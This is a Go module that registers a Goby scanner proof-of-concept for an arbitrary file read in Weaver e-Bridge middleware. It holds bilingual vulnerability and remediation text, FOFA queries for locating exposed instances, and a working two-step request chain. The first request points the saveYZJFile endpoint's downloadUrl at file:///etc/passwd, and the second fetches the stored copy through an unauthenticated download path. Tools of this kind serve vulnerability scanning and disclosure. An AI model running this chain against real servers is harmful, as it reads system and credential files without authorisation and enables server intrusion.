package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver e-Bridge Arbitrary File Read Vulnerability",
    "Description": "<p>e-Bridge is a system integration middleware developed by Shanghai Weaver Company for bridging Internet open resources and enterprise information systems. The system saveYZJFile file downloadUrl parameter has an arbitrary file reading vulnerability, and attackers can exploit this vulnerability. The vulnerability accesses arbitrary files on the server, resulting in data leakage and even server hacking.</p>",
    "Impact": "<p>E-Bridge is a system integration middleware developed by Shanghai Weaver Company for bridging Internet open resources and enterprise information systems. </p><p>E-Bridge system saveYZJFile file downloadUrl parameter exists in any file to read Vulnerability, attackers can use this vulnerability to access any file on the server, access data other than legitimate applications, file directories or some secret files (such as server probe files, website administrator background access addresses, database connection files, server configuration files) files, system files, etc.), resulting in data leakage and even server intrusion. </p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. It is recommended that users contact the manufacturer to update the version to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\">https: //www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. </p>",
    "Product": "Panmi-Bridge-E-Bridge",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微云桥任意文件读取漏洞",
            "Description": "泛微云桥（e-Bridge）是上海泛微公司研发的一款用于桥接互联网开放资源与企业信息系统的系统集成中间件，该系统saveYZJFile文件downloadUrl参数存在任意文件读取漏洞，攻击者可利用该漏洞访问服务器上的任意文件，导致数据被泄露，甚至服务器被入侵。",
            "Impact": "<p>泛微云桥（e-Bridge）是上海泛微公司研发的一款用于桥接互联网开放资源与企业信息系统的系统集成中间件。</p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">泛微云桥</span>系统saveYZJFile文件downloadUrl参数存在任意文件读取漏洞，攻击者可利用该漏洞访问服务器上的任意文件，访问合法应用之外的数据、文件目录或某些隐秘文件（如服务器探针文件、网站管理员后台访问地址、数据库连接文件、服务器配置文件、系统文件等），导致数据被泄露，甚至服务器被入侵。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，建议用户联系厂商更新版本修复漏洞：<a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "泛微云桥e-Bridge",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Weaver e-Bridge Arbitrary File Read Vulnerability",
            "Description": "<p>e-Bridge is a system integration middleware developed by Shanghai Weaver Company for bridging Internet open resources and enterprise information systems. The system saveYZJFile file downloadUrl parameter has an arbitrary file reading vulnerability, and attackers can exploit this vulnerability. The vulnerability accesses arbitrary files on the server, resulting in data leakage and even server hacking.</p>",
            "Impact": "<p>E-Bridge is a system integration middleware developed by Shanghai Weaver Company for bridging Internet open resources and enterprise information systems. </p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">E-Bridge</span> system saveYZJFile file downloadUrl parameter exists in any file to read Vulnerability, attackers can use this vulnerability to access any file on the server, access data other than legitimate applications, file directories or some secret files (such as server probe files, website administrator background access addresses, database connection files, server configuration files) files, system files, etc.), resulting in data leakage and even server intrusion. </p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. It is recommended that users contact the manufacturer to update the version to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https: //www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. </p>",
            "Product": "Panmi-Bridge-E-Bridge",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "((body=\"content=\\\"泛微云桥e-Bridge\\\"\"  && body=\"content=\\\"webkit\\\"\") || title=\"泛微云桥e-Bridge\") || title=\"泛微云桥e-Bridge\"",
    "GobyQuery": "((body=\"content=\\\"泛微云桥e-Bridge\\\"\"  && body=\"content=\\\"webkit\\\"\") || title=\"泛微云桥e-Bridge\") || title=\"泛微云桥e-Bridge\"",
    "Author": "1794790963@qq.com",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2020-09-12",
    "References": [],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "filepath",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "filesize",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "name|lastbody|regex|id\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/file/fileNoLogin/{{{name}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:\\w*:\\d:\\d:\\w*:(.*?)sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "filepath",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "filesize",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "name|lastbody|regex|id\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/file/fileNoLogin/{{{name}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:\\w*:\\d:\\d:\\w*:(.*?)sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
